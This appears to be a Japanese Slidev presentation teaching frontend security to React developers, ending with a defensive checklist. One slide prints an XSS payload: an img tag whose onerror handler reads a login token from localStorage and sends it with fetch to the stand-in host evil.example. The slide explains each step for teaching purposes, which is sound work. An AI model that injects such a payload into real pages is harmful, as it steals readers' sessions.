---
theme: dracula
title: Frontend Security
transition: slide-left
htmlAttrs:
  lang: ja
---

# 🔐 Frontend Security

フレームワークが防いでくれない攻撃

---

# アジェンダ

<div class="agenda">
<Link to="browser" class="agenda-item"><span class="num">01</span> ブラウザの仕組み<small>頭字語の先へ：XSS、Cookie、CSP</small></Link>
<Link to="dangerous-code" class="agenda-item" style="--accent: var(--green)"><span class="num">02</span> 危険なコード<small>Reactの保護から外れるところ</small></Link>
<Link to="dependencies" class="agenda-item" style="--accent: var(--cyan)"><span class="num">03</span> 自分が書いていないコード<small>他人の問題が自分の問題になる</small></Link>
<Link to="incidents" class="agenda-item" style="--accent: var(--orange)"><span class="num">04</span> 実際に起きた<small>実際のインシデント、React自身も</small></Link>
</div>

---

# PRで見たことは？

<div class="sub">投稿本文はCMSからHTMLで来るので、HTMLとして描画する</div>

```jsx
function Post({ post }) {
  // post.bodyはCMSから来るHTML：見出し、リンク、画像
  return (
    <article dangerouslySetInnerHTML={{ __html: post.body }} />
  )
}
```

<div class="flow">
  <div class="step">投稿者<small>ゲスト、編集者</small></div>
  <lucide-arrow-right class="arrow" />
  <div class="step">CMS<small>HTMLを保存</small></div>
  <lucide-arrow-right class="arrow" />
  <div class="step lit">&lt;Post&gt;<small>HTMLとして描画</small></div>
  <lucide-arrow-right class="arrow" />
  <div class="step">全読者のブラウザ</div>
</div>

<div class="note text-center">投稿を書ける人が、全読者に届くHTMLを決める：ゲスト投稿者や、編集者アカウントを乗っ取った誰かでも</div>

<div class="bridge">では、投稿者が本文に<b>これ</b>を保存したら？</div>

---

# 画像タグ1つで、トークンが盗まれる

<div class="sub">攻撃者がCMSに保存する投稿本文を、<code>&lt;Post&gt;</code>コンポーネントが描画する</div>

<div class="cols middle">
<div>

```html {1|2|3|4|all}
<img src="x"
  onerror="
    const t = localStorage.token
    fetch('https://evil.example/?t=' + t)
  ">
```

<ol class="steps">
  <li v-click="1"><b>src="x"</b>：存在しないxというファイルを指すので、読み込みは<i>必ず</i>失敗する</li>
  <li v-click="2"><b>onerror</b>：失敗すると、ブラウザがこの属性をJavaScriptとして実行する。あなたのコードと同じ権限で</li>
  <li v-click="3"><b>localStorage.token</b>：このアプリがそこに置いている、読者のログイントークンを読む</li>
  <li v-click="4"><b>fetch(…)</b>：トークンを攻撃者のサーバーへ送る。ブラウザにとっては、ただのリクエスト</li>
  <li v-click="5" class="why"><b>なぜ画像？</b> innerHTML経由で入れた<code>&lt;script&gt;</code>は実行されないが、<code>onerror</code>は必ず実行される。画像は失敗するためだけに存在する</li>
</ol>

</div>
<div class="fit hook-result">

<div class="devtools">
<div class="dt-h">DevTools → Network</div>
<div class="dt-row ng">GET https://evil.example/?t=demo-token-not-a-secret</div>
<div class="dt-row">(failed) net::ERR_NAME_NOT_RESOLVED</div>
</div>

<div class="note">evil.exampleは存在しない。本物の攻撃者のサーバーなら、URLからトークンを記録する</div>

<div class="pills"><DemoLink href="demos/hook.html">デモページを開く</DemoLink></div>

</div>
</div>

<div class="source"><lucide-link /><a href="https://developer.mozilla.org/ja/docs/Web/API/Element/innerHTML#security_considerations" target="_blank">MDN：innerHTML、セキュリティ上の考慮事項</a></div>

<style>
.steps { font-size: 0.8rem; margin-top: 0.6rem; }
.steps li { margin: 0.25rem 0; }
.steps b { color: var(--orange); font-family: var(--slidev-code-font-family, monospace); font-weight: normal; }
.steps .why { list-style: none; margin-left: -1.2rem; margin-top: 0.6rem; }
.steps .why b { color: var(--cyan); font-family: inherit; font-weight: bold; }
.hook-result { width: 22rem; }
</style>

---
src: ./pages/01-browser.md
---

---
src: ./pages/02-dangerous-code.md
---

---
src: ./pages/03-dependencies.md
---

---
src: ./pages/04-incidents.md
---

---

# 出す前に：チェックリスト

<div class="sub">セクションごとに1枚</div>

<div class="checklist">
<div class="card">
<div class="col-h"><span class="num">01</span> ブラウザ</div>

- **セッショントークン**：HttpOnly、SameSiteのCookieに
- **GETでデータを変更しない**：LaxでもCookieは送られる
- **CSP**：`'unsafe-inline'`なしで

</div>
<div class="card" style="--accent: var(--green)">
<div class="col-h"><span class="num">02</span> 自分のコード</div>

- **ユーザーデータを渡さない**：`innerHTML`、`eval`、`location.href`に
- **描画が必要なHTML**：サニタイズする（DOMPurify）
- **scriptタグ内のJSON**：`<`をエスケープ

</div>
<div class="card" style="--accent: var(--cyan)">
<div class="col-h"><span class="num">03</span> 自分が書いていないコード</div>

- **インストール**：ロックファイルから、リリース経過時間の遅延を付けて
- **インストールスクリプト**：許可しない限り無効（npm：`ignore-scripts`）
- **サードパーティのスクリプト**：`integrity`ハッシュ、または自分でホスト
- **環境変数**：`NEXT_PUBLIC_`に秘密情報を入れない

</div>
<div class="card" style="--accent: var(--orange)">
<div class="col-h"><span class="num">04</span> フレームワーク</div>

- **セキュリティ勧告**：出た瞬間にパッチ
- **更新するパッケージを間違えない**：Next.jsでは`react`ではなく`next`

</div>
</div>

<style>
.checklist { display: grid; grid-template-columns: 1fr 1fr; gap: 0.6rem; margin-top: 0.6rem; }
.checklist .card { padding: 0.5rem 0.9rem; border-left: 3px solid var(--accent, var(--purple)); }
.checklist .col-h { margin-bottom: 0.1rem; }
.checklist .num { color: var(--accent, var(--purple)); font-weight: bold; margin-right: 0.3rem; }
.checklist li { font-size: 0.75rem; }
</style>

---
layout: center
class: text-center
---

# セキュリティは自分が担う

<div class="cta">フレームワークは代わりにやってくれない：自分のコード、自分の依存、自分の判断</div>

<div class="pills">
<a class="pill" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank"><lucide-link />OWASP：XSSの防止</a>
<a class="pill" href="https://developer.mozilla.org/ja/docs/Web/Security" target="_blank"><lucide-link />MDN：ウェブセキュリティ</a>
<a class="pill" href="https://nextjs.org/docs/app/guides/data-security" target="_blank"><lucide-link />Next.js：データセキュリティ</a>
<a class="pill" href="https://pnpm.io/supply-chain-security" target="_blank"><lucide-link />pnpm：サプライチェーンセキュリティ</a>
<DemoLink href="demos/index.html">デモページ</DemoLink>
</div>
